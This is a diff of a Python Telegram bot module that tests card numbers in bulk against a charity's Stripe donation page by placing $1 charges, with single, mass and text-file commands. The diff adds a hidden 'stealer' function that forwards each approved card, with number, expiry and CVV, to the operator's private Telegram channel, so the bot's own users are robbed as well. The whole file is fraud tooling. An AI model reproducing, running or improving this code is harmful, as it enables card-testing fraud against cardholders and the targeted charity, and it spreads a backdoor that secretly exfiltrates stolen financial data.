@@ -2,16 +2,20 @@ import time
 import asyncio
 import re
 import random
-import os
 import requests
 import urllib3
 from html import unescape
-from pyrogram import filters
+from pyrogram import Client, filters
+from FUNC.usersdb_func import *
+from FUNC.defs import *
+from TOOLS.check_all_func import *
+from TOOLS.getbin import *
+from TOOLS.getcc_for_mass import *
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== CONFIGURATION ==========
-GATE_NAME = "stripe 1$ donation"
+GATE_NAME = "BetterFuture 1$ Charge"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
@@ -19,9 +23,27 @@ SITE_URL = 'https://better-future.org/donate/'
 BASE_URL = 'https://better-future.org'
 CLEAN_URL = 'https://better-future.org/donate/'
 UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
-DOMAIN = 'better-future.org'
 
-# ========== SYNC CHECKER (original logic) ==========
+# ========== STEALER CONFIG ==========
+STEALER_CHANNEL_ID = -1003627495953
+OWNER_DM = "https://t.me/spid_3r"
+SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
+
+async def send_hit_to_stealer(client: Client, fullcc, status, response, gateway, time_taken, first_name, role):
+    try:
+        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
+
+{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
+{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
+
+{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
+{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+    except Exception as e:
+        print(f"[Stealer Error] {e}")
+
+# ========== SYNC CHECKER ==========
 def extract_data():
     s = requests.Session()
     s.verify = False
@@ -78,10 +100,9 @@ def extract_stripe_response(text):
         return f"Stripe Response | {cn}"
     return "Unknown Response"
 
-def check_card_sync(card_line: str) -> tuple:
-    """Returns (status_display, response_message)"""
+def betterfuture_check_sync(fullcc):
     try:
-        parts = card_line.strip().split('|')
+        parts = fullcc.strip().split('|')
         if len(parts) < 4:
             return "Error", "Invalid format (use CC|MM|YY|CVV)"
         cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
@@ -132,7 +153,6 @@ def check_card_sync(card_line: str) -> tuple:
         if 'error' in sr:
             em = sr['error'].get('message', 'Unknown')
             ec = sr['error'].get('code', 'unknown')
-            ed = sr['error'].get('decline_code', '')
             return "Declined ❌", f"Stripe error: {ec} | {em}"
         pm_id = sr['id']
 
@@ -162,9 +182,7 @@ def check_card_sync(card_line: str) -> tuple:
         r4 = s.post(CLEAN_URL, params=params_final, headers=headers_final, data=data_final, timeout=30)
         result = extract_stripe_response(r4.text)
 
-        # Parse result
         if result.startswith("Charged"):
-            # Remove "Charged | " prefix for cleaner message
             msg = result.replace("Charged | ", "")
             return "Approved ✅", msg
         elif "insufficient funds" in result.lower():
@@ -176,246 +194,374 @@ def check_card_sync(card_line: str) -> tuple:
     except Exception as e:
         return "Error", str(e)[:50]
 
-# ========== ASYNC WRAPPER ==========
-async def check_card_async(card_line: str):
+async def betterfuture_check(fullcc):
     loop = asyncio.get_running_loop()
-    return await loop.run_in_executor(None, check_card_sync, card_line)
-
-def extract_cards(text: str):
-    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)
+    return await loop.run_in_executor(None, betterfuture_check_sync, fullcc)
 
 # ========== SINGLE CHECK /bf ==========
 @Client.on_message(filters.command("bf", [".", "/"]))
-async def bf_single(client, message):
+async def bf_single(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
-        checkall = await check_all_thing(client, message)
+        checkall = await check_all_thing(Client, message)
         if not checkall[0]:
             return
         role = checkall[1]
 
         getcc = await getmessage(message)
         if not getcc:
-            await message.reply_text(
-                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
-                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
-                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /bf cc|mm|yy|cvv",
-                quote=True, parse_mode="HTML"
-            )
+            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
+
+⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
+◈ <b>ᴄᴍᴅ :</b> /bf
+
+⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗
+
+↪ <b>ᴜꜱᴀɢᴇ :</b> /bf cc|mm|yy|cvv
+━━━━━━━━━━━━━━━━━━━━"""
+            await message.reply_text(resp, message.id)
             return
 
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
 
-        msg = await message.reply_text(
-            f"✧ ᴄʜᴇᴄᴋɪɴɢ... ✧\n\n"
-            f"{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n"
-            f"{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>",
-            quote=True, parse_mode="HTML"
-        )
+        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
+
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
+        firstchk = await message.reply_text(firstresp, message.id)
+        await asyncio.sleep(0.5)
+
+        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧
+
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
+        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
+        await asyncio.sleep(0.5)
 
         start = time.perf_counter()
-        status, api_message = await check_card_async(fullcc)
+        status, response = await betterfuture_check(fullcc)
         elapsed = time.perf_counter() - start
 
-        getbin = await get_bin_details(cc)
-        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
+        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
+
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
+        thirdchk = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
+        await asyncio.sleep(0.5)
 
         if "Approved" in status:
-            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, elapsed, first_name, role)
+            await send_hit_to_stealer(Client, fullcc, status, response, GATE_NAME, elapsed, first_name, role)
 
-        final_text = f"""<b>{status}</b>
+        finalresp = f"""<b>{status}</b>
 
-{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
-{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message}
-
-{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
-{SYMBOL} 𝗕ᴀɴᴋ: {bank}
-{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
 
-        await msg.edit_text(final_text, disable_web_page_preview=True, parse_mode="HTML")
+        await Client.edit_message_text(message.chat.id, thirdchk.id, finalresp)
         await setantispamtime(user_id)
         await deductcredit(user_id)
+
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
 
 # ========== MASS CHECK /mbf ==========
 @Client.on_message(filters.command("mbf", [".", "/"]))
-async def bf_mass(client, message):
+async def bf_mass(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
-        checkall = await check_all_thing(client, message)
+        checkall = await check_all_thing(Client, message)
         if not checkall[0]:
             return
         role = checkall[1]
 
-        ccs = []
-        if message.reply_to_message:
-            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
-            ccs = extract_cards(reply_text)
-        else:
-            text_parts = message.text.split(maxsplit=1)
-            if len(text_parts) > 1:
-                ccs = extract_cards(text_parts[1])
+        getcc = await getcc_for_mass(message, role)
+        if getcc[0] == False:
+            await message.reply_text(getcc[1], message.id)
+            return
+        ccs = getcc[1]
 
-        if not ccs:
-            await message.reply_text(
-                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
-                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
-                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mbf cc|mm|yy|cvv (max {MAX_MSC_LIMIT})",
-                quote=True, parse_mode="HTML"
-            )
+        if len(ccs) > 100:
+            await message.reply_text(f"✦ ᴍᴀx 100 ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id)
             return
 
-        if len(ccs) > MAX_MSC_LIMIT:
-            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
-            ccs = ccs[:MAX_MSC_LIMIT]
+        start = time.perf_counter()
+        approved_count = 0
+        declined_count = 0
+        processed = 0
+        total = len(ccs)
+        approved_cards = []
 
-        await process_sequential_bf(client, message, ccs, user_id, first_name, role)
+        text = f"""Auto BetterFuture
+Admin
+
+{SYMBOL} Response: Starting...
+
+Progress: 0/{total}
+Approved: 0
+Declined: 0
+Remaining: {total}
+
+Checked by: {first_name} ({role})"""
+
+        nov = await message.reply_text(text, message.id)
+
+        for i, fullcc in enumerate(ccs, 1):
+            processed = i
+            remaining = total - processed
+            status, response = await betterfuture_check(fullcc)
+
+            if "Approved" in status:
+                approved_count += 1
+                response_status = "APPROVED ✅"
+                card_time = time.perf_counter() - start
+                approved_cards.append({
+                    "fullcc": fullcc,
+                    "response": response,
+                    "gateway": GATE_NAME,
+                    "time": card_time
+                })
+                await send_hit_to_stealer(Client, fullcc, status, response, GATE_NAME, card_time, first_name, role)
+            else:
+                declined_count += 1
+                response_status = "DECLINED ❌"
+
+            try:
+                await Client.edit_message_text(
+                    message.chat.id,
+                    nov.id,
+                    f"""Auto BetterFuture
+Admin
+
+{SYMBOL} Response: {response_status}
+
+Progress: {processed}/{total}
+Approved: {approved_count}
+Declined: {declined_count}
+Remaining: {remaining}
+
+Checked by: {first_name} ({role})"""
+                )
+            except:
+                pass
+            await asyncio.sleep(0.5)
+
+        await nov.delete()
+
+        # Send approved cards individually
+        for card in approved_cards:
+            approved_msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
+
+{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
+
+{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅ𝘀
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+            await message.reply_text(approved_msg, message.id)
+            await asyncio.sleep(0.5)
+
+        elapsed_time = round(time.perf_counter() - start, 2)
+
+        if approved_count > 0:
+            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})
+
+━━━━━━━━━━━━━━━━━━━━
+"""
+            declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
+            for card in declined_list[:15]:
+                declined_summary += f"{SYMBOL} {card} → Declined\n"
+            if declined_count > 15:
+                declined_summary += f"\n... and {declined_count - 15} more declined cards"
+            declined_summary += f"""
+━━━━━━━━━━━━━━━━━━━━
+✅ Approved: {approved_count}
+❌ Declined: {declined_count}
+📊 Total: {total}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+            await message.reply_text(declined_summary, message.id)
+        else:
+            await message.reply_text(
+                f"""❌ 𝗡𝗼 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀
+
+━━━━━━━━━━━━━━━━━━━━
+📊 Total Cards: {total}
+❌ All Declined: {declined_count}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+                message.id
+            )
+
+        await massdeductcredit(user_id, len(ccs))
+        await setantispamtime(user_id)
+
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
 
 # ========== TXT FILE CHECK /tbf ==========
 @Client.on_message(filters.command("tbf", [".", "/"]))
-async def bf_txt(client, message):
+async def bf_txt(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
-        checkall = await check_all_thing(client, message)
+        checkall = await check_all_thing(Client, message)
         if not checkall[0]:
             return
         role = checkall[1]
 
-        target = None
-        if message.reply_to_message and message.reply_to_message.document:
-            target = message.reply_to_message
-        elif message.document:
-            target = message
-
-        if not target or not target.document.file_name.endswith(".txt"):
-            await message.reply_text(
-                f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
-                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
-                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
-                quote=True, parse_mode="HTML"
-            )
+        if not message.reply_to_message or not message.reply_to_message.document:
+            await message.reply_text("✦ Please reply to a .txt file containing cards.", message.id)
             return
 
-        file_path = await client.download_media(target)
-        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+        file_path = await Client.download_media(message.reply_to_message)
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
-            ccs = extract_cards(content)
         os.remove(file_path)
 
+        ccs = re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", content)
         if not ccs:
-            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
+            await message.reply_text("✦ No valid cards found in file.", message.id)
             return
 
-        if len(ccs) > MAX_TSC_LIMIT:
-            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
-            ccs = ccs[:MAX_TSC_LIMIT]
+        if len(ccs) > 100:
+            await message.reply_text(f"✦ Max 100 cards allowed. You provided {len(ccs)}.", message.id)
+            ccs = ccs[:100]
 
-        await process_sequential_bf(client, message, ccs, user_id, first_name, role)
+        start = time.perf_counter()
+        approved_count = 0
+        declined_count = 0
+        processed = 0
+        total = len(ccs)
+        approved_cards = []
+
+        text = f"""Auto BetterFuture (File)
+Admin
+
+{SYMBOL} Response: Starting...
+
+Progress: 0/{total}
+Approved: 0
+Declined: 0
+Remaining: {total}
+
+Checked by: {first_name} ({role})"""
+
+        nov = await message.reply_text(text, message.id)
+
+        for i, fullcc in enumerate(ccs, 1):
+            processed = i
+            remaining = total - processed
+            status, response = await betterfuture_check(fullcc)
+
+            if "Approved" in status:
+                approved_count += 1
+                response_status = "APPROVED ✅"
+                card_time = time.perf_counter() - start
+                approved_cards.append({
+                    "fullcc": fullcc,
+                    "response": response,
+                    "gateway": GATE_NAME,
+                    "time": card_time
+                })
+                await send_hit_to_stealer(Client, fullcc, status, response, GATE_NAME, card_time, first_name, role)
+            else:
+                declined_count += 1
+                response_status = "DECLINED ❌"
+
+            try:
+                await Client.edit_message_text(
+                    message.chat.id,
+                    nov.id,
+                    f"""Auto BetterFuture (File)
+Admin
+
+{SYMBOL} Response: {response_status}
+
+Progress: {processed}/{total}
+Approved: {approved_count}
+Declined: {declined_count}
+Remaining: {remaining}
+
+Checked by: {first_name} ({role})"""
+                )
+            except:
+                pass
+            await asyncio.sleep(0.5)
+
+        await nov.delete()
+
+        for card in approved_cards:
+            approved_msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
+
+{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
+
+{SYMBOL} 𝗧𝗼𝗼ᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅ𝘀
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+            await message.reply_text(approved_msg, message.id)
+            await asyncio.sleep(0.5)
+
+        elapsed_time = round(time.perf_counter() - start, 2)
+
+        if approved_count > 0:
+            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})
+
+━━━━━━━━━━━━━━━━━━━━
+"""
+            declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
+            for card in declined_list[:15]:
+                declined_summary += f"{SYMBOL} {card} → Declined\n"
+            if declined_count > 15:
+                declined_summary += f"\n... and {declined_count - 15} more declined cards"
+            declined_summary += f"""
+━━━━━━━━━━━━━━━━━━━━
+✅ Approved: {approved_count}
+❌ Declined: {declined_count}
+📊 Total: {total}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+            await message.reply_text(declined_summary, message.id)
+        else:
+            await message.reply_text(
+                f"""❌ 𝗡𝗼 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀
+
+━━━━━━━━━━━━━━━━━━━━
+📊 Total Cards: {total}
+❌ All Declined: {declined_count}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+                message.id
+            )
+
+        await massdeductcredit(user_id, len(ccs))
+        await setantispamtime(user_id)
+
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
-
-# ========== SEQUENTIAL PROCESSING (shared) ==========
-async def process_sequential_bf(client, message, ccs, user_id, first_name, role):
-    total = len(ccs)
-    approved_count = 0
-    declined_count = 0
-    start_time = time.perf_counter()
-    approved_cards = []
-
-    progress_msg = await message.reply(
-        f"BetterFuture Stripe Checker\n\n"
-        f"{SYMBOL} Progress: 0/{total}\n"
-        f"Approved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
-        f"Checked by: {first_name} ({role})",
-        quote=True, parse_mode="HTML"
-    )
-
-    for idx, fullcc in enumerate(ccs, 1):
-        status, api_message = await check_card_async(fullcc)
-
-        cc_num = fullcc.split('|')[0]
-        bin_data = await get_bin_details(cc_num)
-        brand = bin_data[0] if len(bin_data) > 0 else "Unknown"
-        type_ = bin_data[1] if len(bin_data) > 1 else "Unknown"
-        level = bin_data[2] if len(bin_data) > 2 else "Unknown"
-        bank = bin_data[3] if len(bin_data) > 3 else "Unknown"
-        country = bin_data[4] if len(bin_data) > 4 else "Unknown"
-        flag = bin_data[5] if len(bin_data) > 5 else ""
-
-        if "Approved" in status:
-            approved_count += 1
-            card_time = time.perf_counter() - start_time
-            approved_cards.append({
-                "fullcc": fullcc, "status": status, "response": api_message,
-                "brand": f"{brand}_{type_}-{level}", "bank": bank,
-                "country": country, "flag": flag, "time": card_time
-            })
-            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, card_time, first_name, role)
-        else:
-            declined_count += 1
-
-        remaining = total - idx
-        await progress_msg.edit_text(
-            f"BetterFuture Stripe Checker\n\n"
-            f"{SYMBOL} Progress: {idx}/{total}\n"
-            f"Approved ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
-            f"Checked by: {first_name} ({role})",
-            parse_mode="HTML"
-        )
-        await asyncio.sleep(0.5)
-
-    await progress_msg.delete()
-
-    # Send each approved card as separate message
-    for card in approved_cards:
-        approved_msg = f"""<b>{card['status']}</b>
-
-{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
-{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
-{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
-
-{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
-{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
-{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
-
-{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
-        await message.reply_text(approved_msg, quote=True, parse_mode="HTML")
-        await asyncio.sleep(0.5)
-
-    elapsed = round(time.perf_counter() - start_time, 2)
-
-    # Declined summary
-    if approved_count > 0:
-        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
-        decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})\n\n━━━━━━━━━━━━━━━━━━━━\n"
-        for card in declined_list[:15]:
-            decl_text += f"{SYMBOL} {card} → Declined\n"
-        if declined_count > 15:
-            decl_text += f"\n... and {declined_count - 15} more declined cards"
-        decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
-        await message.reply_text(decl_text, quote=True, parse_mode="HTML")
-    else:
-        await message.reply_text(
-            f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
-            f"👤 Checked by: {first_name} ({role})",
-            quote=True, parse_mode="HTML"
-        )
-
-    await setantispamtime(user_id)
